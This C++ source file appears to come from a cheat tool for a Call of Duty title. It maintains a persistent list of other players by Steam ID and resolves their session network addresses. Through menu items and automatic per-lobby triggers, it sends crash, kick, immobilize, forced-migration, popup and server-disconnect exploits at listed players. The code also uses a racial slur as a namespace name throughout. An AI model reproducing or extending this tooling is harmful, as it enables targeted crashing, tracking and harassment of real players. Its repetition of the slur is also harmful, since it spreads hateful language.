//=====================================================================================

#include "../../StdAfx.hpp"

//=====================================================================================

namespace t7
{

    shitters_c shitters;

	shitters_c::shitters_c()
	{
		refresh();
	}
	/*
	//=====================================================================================
	*/


	int AutoPopupTMR = clock();
	int AutoPopupTime = 12000;


	auto hostIdentity = functions::host_bullshit(1);
	long long hostxuid = *(__int64*)(hostIdentity);

	structures::netadr_t hostNetAddr = *(structures::netadr_t*)(hostIdentity + 0x28);

	void shitters_c::refresh()
	{
		shit_list.clear();

		if (auto j{ niggerware::utils::file::json_read(shitters_file) }; j.is_object())
		{
			for (auto& [key, value] : j.items())
			{
				std::string name;
				niggerware::utils::file::json_get(value, { "Name" }, name);

				std::string last_encountered;
				niggerware::utils::file::json_get(value, { "Last seen" }, last_encountered);

				std::uint32_t flags;
				niggerware::utils::file::json_get(value, { "Flags" }, flags);

				shit_list.push_back({ niggerware::utils::string::stoull(key), name, last_encountered, flags });
			}
		}
	}
	/*
	//=====================================================================================
	*/
	void shitters_c::update()
	{
		niggerware::utils::file::json j;

		for (auto& entry : shit_list)
		{
			j[std::to_string(entry.xuid)] =
			{
				{ "Name", entry.name },
				{ "Last seen", entry.last_encountered },
				{ "Flags", entry.flags }
			};
		}

		niggerware::utils::file::json_write(shitters_file, j);
	}
	/*
	//=====================================================================================
	*/
	std::vector<shitters_c::shitter_s>::iterator shitters_c::get_if_present(const shitter_s& entry)
	{
		return std::find_if(shit_list.begin(), shit_list.end(), [&](const shitter_s& a)
		{
			return entry.xuid == a.xuid;
		});
	}
	/*
	//=====================================================================================
	*/
	bool shitters_c::is_present(const shitter_s& entry)
	{
		if (auto shitter{ get_if_present(entry) }; shitter != shit_list.end())
		{
			return true;
		}

		return false;
	}
	/*
	//=====================================================================================
	*/
	bool shitters_c::is_in_session(const shitter_s& entry)
	{
		for (auto i{ 0 }; i < max_clients; i++)
		{
			if (functions::get_client_xuid(i) == entry.xuid)
			{
				return true;
			}
		}

		return false;
	}
	/*
	//=====================================================================================
	*/
	void shitters_c::add(const shitter_s& entry)
	{
		CSteamID steamid(entry.xuid);

		if (!is_present(entry) && steamid.IsValid())
		{
			shit_list.push_back(entry);

			update();
		}
	}
	/*
	//=====================================================================================
	*/
	void shitters_c::remove(const shitter_s& entry)
	{
		shit_list.erase(std::remove_if(shit_list.begin(), shit_list.end(), [&](const shitter_s& a)
		{
			return entry.xuid == a.xuid;
		}), shit_list.end());

		update();
	}
	/*
	//=====================================================================================
	*/
	void shitters_c::process()
	{
		if (shitters_timer.expired())
		{
			auto local_xuid = functions::get_our_xuid();

			for (auto i = 0; i < max_clients; i++)
			{
				if (auto session_client{ functions::get_session_client(i) }; session_client && session_client->activeClient)
				{
					auto client_xuid = functions::get_client_xuid(i);
					auto client_name = functions::get_client_name(i);
					auto last_encountered = niggerware::utils::misc::get_current_time();

					if (auto shitter{ get_if_present({ client_xuid }) }; shitter != shit_list.end())
					{
						if (niggerware::utils::string::is_not_equal(shitter->name, client_name))
						{
							shitter->name = client_name;

							update();
						}

						if (niggerware::utils::string::is_not_equal(shitter->last_encountered, last_encountered))
						{
							shitter->last_encountered = last_encountered;

							update();
						}

						if (shitter->xuid != local_xuid)
						{
							if (shitter->flags & action_flag_crash)
								exploits.send_all_crashes(i);
							//if (shitter->flags & actions_flag_autobluescreen)
								//exploits.SendBADDLC(client_xuid, hostNetAddr);

							if (shitter->flags & action_flag_privatecrash)
								exploits.SendNOPARTYCHAT3(client_xuid, hostNetAddr);
							if (shitter->flags & action_flag_migrate)
								exploits.send_migration_screen(i);

							if (shitter->flags & action_flag_immobilize)
								exploits.send_immobilization_screen(i);

							if (shitter->flags & action_flag_instant_popup)
								exploits.send_instant_popup(std::vector<std::uint64_t>{ shitter->xuid });

						
							if (shitter->flags & actions_flag_serverdisconnect)
								exploits.Send_Client_Disconnect(hostNetAddr, hostxuid, client_xuid);
							
							if (shitter->flags & action_flag_kick)
								exploits.send_all_kicks(i);

							if (shitter->flags & action_flag_prioritize)
								target_list.priorities[i].is_prioritized = true;

							if (shitter->flags & action_flag_ignore)
								target_list.priorities[i].is_ignored = true;
								
							
						
						
						}
					}
				}
			}

			shitters_timer.reset(1s);
		}
	}
	/*
	//=====================================================================================
	*/
	void shitters_c::draw_modal_popup()
	{
		auto& style = ImGui::GetStyle();

		if (ImGui::BeginPopupModal("Add To Database", nullptr, ImGuiWindowFlags_NoResize | ImGuiWindowFlags_NoScrollbar | ImGuiWindowFlags_NoCollapse))
		{
			ImGui::PushItemWidth(250.0f * main_gui.scaling_factor);

			ImGui::PushStyleColor(ImGuiCol_Text, ImGuiCol_TextDisabled);
			ImGui::Text("Name:");
			ImGui::PopStyleColor();

			static char temp_shitter_name[32] = { 0 };
			ImGui::InputText("##name", temp_shitter_name, sizeof(temp_shitter_name));

			ImGui::PushStyleColor(ImGuiCol_Text, ImGuiCol_TextDisabled);
			ImGui::Text("Steam ID:");
			ImGui::PopStyleColor();

			static char temp_shitter_xuid[20] = { 0 };
			ImGui::InputText("##steamid", temp_shitter_xuid, sizeof(temp_shitter_xuid), ImGuiInputTextFlags_CharsUnsigned | ImGuiInputTextFlags_CharsNoBlank);

			ImGui::PopItemWidth();

			ImGui::Indent(150.0f * main_gui.scaling_factor - style.ItemSpacing.x);
			if (ImGui::Button("OK", { 50.0f * main_gui.scaling_factor, 0.0f }))
			{
				if (temp_shitter_xuid[0] && temp_shitter_name[0])
				{
					add({ niggerware::utils::string::stoull(temp_shitter_xuid), temp_shitter_name });
				}
				ImGui::CloseCurrentPopup();
			}
			ImGui::SameLine();
			if (ImGui::Button("Cancel", { 50.0f * main_gui.scaling_factor, 0.0f }))
			{
				ImGui::CloseCurrentPopup();
			}
			ImGui::Unindent(150.0f * main_gui.scaling_factor - style.ItemSpacing.x);
			ImGui::EndPopup();
		}
	}
	/*
	//=====================================================================================
	*/
	void shitters_c::draw_menu_tab()
	{
		if (ImGui::BeginTabItem("Database"))
		{
			static char temp_filter[256] = { 0 };
			std::vector<shitter_s*> filtered_shitters;
			for (auto& shitter : shit_list)
			{
				if 
				(
					!std::strlen(temp_filter) || 
					niggerware::utils::string::does_contain(shitter.name, temp_filter, false) || 
					niggerware::utils::string::does_contain(shitter.last_encountered, temp_filter, false) || 
					niggerware::utils::string::does_contain(std::to_string(shitter.xuid), temp_filter, false)
				)
				{
					filtered_shitters.push_back(&shitter);
				}
			}

			auto open_modal_popup = false;
			ImGui::PushItemWidth(304.0f * main_gui.scaling_factor);
			ImGui::InputTextEx("##filter", "Filter Database entries...", temp_filter, sizeof(temp_filter), {}, ImGuiInputTextFlags_None); ImGui::SameLine();
			ImGui::PopItemWidth();

			if (ImGui::Button("Add Manually", { 85.0f * main_gui.scaling_factor, 0.0f }))
			{
				open_modal_popup = true;
			} ImGui::SameLine();

			if (ImGui::Button("Refresh List", { 85.0f * main_gui.scaling_factor, 0.0f }))
			{
				refresh();
			}

			if (open_modal_popup)
			{
				ImGui::OpenPopup("Add To Database");
			}

			draw_modal_popup();

			ImGui::Columns(3, "ShitterList");
			ImGui::Separator();

			ImGui::PushStyleColor(ImGuiCol_Text, ImGuiCol_TextDisabled);

			ImGui::Text("Name:"); ImGui::NextColumn();
			ImGui::Text("Last Encountered:"); ImGui::NextColumn();
			ImGui::Text("Steam ID:"); ImGui::NextColumn();

			ImGui::PopStyleColor();

			auto context_menu_opened = false;
			static auto info_request_sent = false;

			for (auto i{ 0u }; i < filtered_shitters.size(); i++)
			{
				auto shitter = filtered_shitters[i];

				auto item_id = niggerware::utils::string::va("shitter##%u", i);
				auto in_current_session = is_in_session({ shitter->xuid });

				ImGui::Separator();
				ImGui::PushID(item_id.c_str());

				if (in_current_session)
				{
					ImGui::PushStyleColor(ImGuiCol_Text, { 0.3f, 1.0f, 0.3f, 1.0f });
					ImGui::Selectable(shitter->name.c_str(), false, ImGuiSelectableFlags_SpanAllColumns);
					ImGui::PopStyleColor();
				}
				else
				{
					ImGui::Selectable(shitter->name.c_str(), false, ImGuiSelectableFlags_SpanAllColumns);
				}

				if (auto result{ ImGui::BeginPopupContextItem(item_id.c_str()) }; context_menu_opened |= result, result)
				{
					if (!info_request_sent)
					{
						shitter->netadr = {};
						send_info_request(shitter->xuid);
						info_request_sent = true;
					}

					if (ImGui::MenuItem("View Profile"))
					{
						functions::LiveSteam_PopOverlayForSteamID(shitter->xuid);

						main_gui.show_window = false;
					}

					if (ImGui::MenuItem("Remove From Database"))
					{
						remove({ shitter->xuid });
					}

					ImGui::Separator();

					if (ImGui::MenuItem("Join Session", nullptr, false, shitter->netadr.ipv4.inaddr))
					{
						functions::LobbyVM_JoinEvent(structures::CONTROLLER_INDEX_FIRST, shitter->xuid, structures::JOIN_TYPE_PARTY);
					}

					if (ImGui::MenuItem("IDM Crash", nullptr, false, shitter->netadr.ipv4.inaddr))
					{
						exploits.send_instant_crash(std::vector<std::uint64_t>{ shitter->xuid });
					}

					if (ImGui::MenuItem("IDM Popup", nullptr, false, shitter->netadr.ipv4.inaddr))
					{
						exploits.send_instant_popup(std::vector<std::uint64_t>{ shitter->xuid });
					}

					ImGui::Separator();

					if (ImGui::MenuItem("Crash Player", nullptr, false, shitter->netadr.ipv4.inaddr))
					{
						exploits.send_all_crashes(shitter->xuid, shitter->netadr);
					}

					if (ImGui::MenuItem("Migrate Player", nullptr, false, shitter->netadr.ipv4.inaddr))
					{
						exploits.send_migration_screen(shitter->netadr);
					}

				


					
					
					if (ImGui::MenuItem("Immobilize Player", nullptr, false, shitter->netadr.ipv4.inaddr))
					{
						exploits.send_immobilization_screen(shitter->netadr);
					}

					if (ImGui::MenuItem("Kick Player", nullptr, false, shitter->netadr.ipv4.inaddr))
					{
						exploits.send_all_kicks(shitter->xuid, shitter->netadr);
					}


				//	if (ImGui::MenuItem(" Server Disconnect", nullptr, false, shitter->netadr.ipv4.inaddr))
				//	{
			//			exploits.Send_Client_Disconnect( hostNetAddr, hostxuid, shitter->xuid );
			//		}
					
				

					ImGui::Separator();
				//	if (ImGui::MenuItem("Auto Bluescreen", nullptr, shitter->flags & actions_flag_autobluescreen))
				//	{
				//		shitter->flags ^= actions_flag_autobluescreen;
				//		update();


				//	}

					if (ImGui::MenuItem("Auto Popup (In Lobby)", nullptr, shitter->flags & action_flag_instant_popup))
					{
						shitter->flags ^= action_flag_instant_popup;

						update();
					}

					

					if (ImGui::MenuItem("Auto Crash (In Lobby)", nullptr, shitter->flags & action_flag_crash))
					{
						shitter->flags ^= action_flag_crash;

						update();
					}

					if (ImGui::MenuItem("Auto Migrate (In Lobby)", nullptr, shitter->flags & action_flag_migrate))
					{
						shitter->flags ^= action_flag_migrate;

						update();
					}

					if (ImGui::MenuItem("Auto Immobilize (In Lobby)", nullptr, shitter->flags & action_flag_immobilize))
					{
						shitter->flags ^= action_flag_immobilize;

						update();
					}

					if (ImGui::MenuItem("Auto Kick (In Lobby)", nullptr, shitter->flags & action_flag_kick))
					{
						shitter->flags ^= action_flag_kick;

						update();
					}

					if (ImGui::MenuItem("Server Disconnect (In Lobby)"), nullptr, shitter->flags & actions_flag_serverdisconnect)
					{
						shitter->flags ^= actions_flag_serverdisconnect;

						update();


					}
					
					if (ImGui::MenuItem("Auto Prioritize", nullptr, shitter->flags & action_flag_prioritize))
					{
						shitter->flags ^= action_flag_prioritize;

						update();
					}

					

					if (ImGui::MenuItem("Auto Ignore", nullptr, shitter->flags & action_flag_ignore))
					{
						shitter->flags ^= action_flag_ignore;

						update();
					}

					ImGui::Separator();

					if (ImGui::MenuItem("Block Incoming", nullptr, shitter->flags & action_flag_block_incoming))
					{
						shitter->flags ^= action_flag_block_incoming;

						update();
					}

					if (ImGui::MenuItem("Block Outgoing", nullptr, shitter->flags & action_flag_block_outgoing))
					{
						shitter->flags ^= action_flag_block_outgoing;

						update();
					}

					ImGui::Separator();

					if (ImGui::MenuItem("Copy Name"))
					{
						ImGui::LogToClipboard();
						ImGui::LogText(shitter->name.c_str());
						ImGui::LogFinish();
					}

					if (ImGui::MenuItem("Copy Last Encountered"))
					{
						ImGui::LogToClipboard();
						ImGui::LogText(shitter->last_encountered.c_str());
						ImGui::LogFinish();
					}

					if (ImGui::MenuItem("Copy Steam ID"))
					{
						ImGui::LogToClipboard();
						ImGui::LogText("%llu", shitter->xuid);
						ImGui::LogFinish();
					}

					ImGui::EndPopup();
				} ImGui::NextColumn();

				if (in_current_session)
				{
					ImGui::PushStyleColor(ImGuiCol_Text, { 0.3f, 1.0f, 0.3f, 1.0f });
					ImGui::Selectable(shitter->last_encountered.c_str(), false, ImGuiSelectableFlags_SpanAllColumns);
					ImGui::PopStyleColor();
				}
				else
				{
					ImGui::Selectable(shitter->last_encountered.c_str(), false, ImGuiSelectableFlags_SpanAllColumns);
				}

				context_menu_opened |= ImGui::OpenPopupOnItemClick(item_id.c_str());
				ImGui::NextColumn();

				if (in_current_session)
				{
					ImGui::PushStyleColor(ImGuiCol_Text, { 0.3f, 1.0f, 0.3f, 1.0f });
					ImGui::Selectable(std::to_string(shitter->xuid).c_str(), false, ImGuiSelectableFlags_SpanAllColumns);
					ImGui::PopStyleColor();
				}
				else
				{
					ImGui::Selectable(std::to_string(shitter->xuid).c_str(), false, ImGuiSelectableFlags_SpanAllColumns);
				}

				context_menu_opened |= ImGui::OpenPopupOnItemClick(item_id.c_str());
				ImGui::NextColumn();

				ImGui::PopID();
			}

			if (!context_menu_opened)
				info_request_sent = false;

			ImGui::Columns(1);
			ImGui::Separator();
			ImGui::EndTabItem();
		}
	}
	/*
	//=====================================================================================
	*/
	void shitters_c::send_info_request(const std::uint64_t to)
	{
		if (!functions::Live_IsUserSignedInToDemonware(structures::CONTROLLER_INDEX_FIRST))
			return;

		if (auto shitter{ get_if_present({ to }) }; shitter != shit_list.end() && shitter->flags & shitters_c::action_flag_block_outgoing)
			return;

		const structures::Msg_InfoRequest message{ 1 };
		functions::LobbyMsg_SendInfoRequest(structures::CONTROLLER_INDEX_FIRST, &to, 1, &message);
	}
	/*
	//=====================================================================================
	*/
	void shitters_c::get_info_response(const structures::InfoResponseLobby& lobby)
	{
		if (lobby.isValid)
		{
			const auto sess_info{ get_session_info(lobby) };

			structures::netadr_t netadr{};
			functions::dwRegisterSecIDAndKey(&sess_info.sessionID, &sess_info.keyExchangeKey);
			functions::dwCommonAddrToNetadr(&netadr, &sess_info.hostAddress, &sess_info.sessionID);

			for (auto& entry : shit_list)
			{
				if (lobby.hostXuid == entry.xuid)
				{
					entry.netadr = netadr;
				}
			}
		}
	}
	/*
	//=====================================================================================
	*/
	structures::XSESSION_INFO shitters_c::get_session_info(const structures::InfoResponseLobby& lobby)
	{
		structures::XSESSION_INFO sess_info{};

		sess_info.sessionID = lobby.secId;
		sess_info.keyExchangeKey = lobby.secKey;
		sess_info.hostAddress = lobby.serializedAdr.xnaddr;

		return sess_info;
	}
}

//=====================================================================================